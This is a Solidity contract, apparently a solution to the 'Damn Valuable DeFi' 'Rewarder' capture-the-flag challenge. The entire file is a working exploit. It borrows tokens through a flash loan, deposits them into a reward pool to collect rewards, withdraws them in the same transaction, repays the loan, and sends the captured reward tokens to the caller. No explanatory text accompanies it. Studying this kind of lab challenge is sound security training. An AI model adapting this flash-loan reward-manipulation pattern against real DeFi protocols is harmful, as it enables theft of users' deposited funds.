pragma solidity ^0.6.0;


import "../DamnValuableToken.sol";
import "./RewardToken.sol";

interface IRewardPool {
    function flashLoan(uint256 amount) external;
}

contract RewardAttacker {
    using Address for address payable;

    DamnValuableToken public liquidityToken;
    RewardToken public rewardToken;
    address public rewardPool;

    constructor(address rewardPool_, address tokenAddress, address rewardTokenAddress) public {
        liquidityToken = DamnValuableToken(tokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        rewardPool = rewardPool_;
    }

    function attack(IRewardPool pool, uint256 amount) external {
        pool.flashLoan(amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(
            rewardPool,
            amount
        );
        
        require(liquidityToken.balanceOf(address(this)) == amount, "Wrong balance");

        (bool success, ) = rewardPool.call(
            abi.encodeWithSignature(
                "deposit(uint256)",
                amount
            )
        );
        require(success, "Deposit call failed");

        (success, ) = rewardPool.call(
            abi.encodeWithSignature(
                "withdraw(uint256)",
                amount
            )
        );
        require(success, "Withdraw call failed");

        liquidityToken.transfer(msg.sender, liquidityToken.balanceOf(address(this)));
    }
}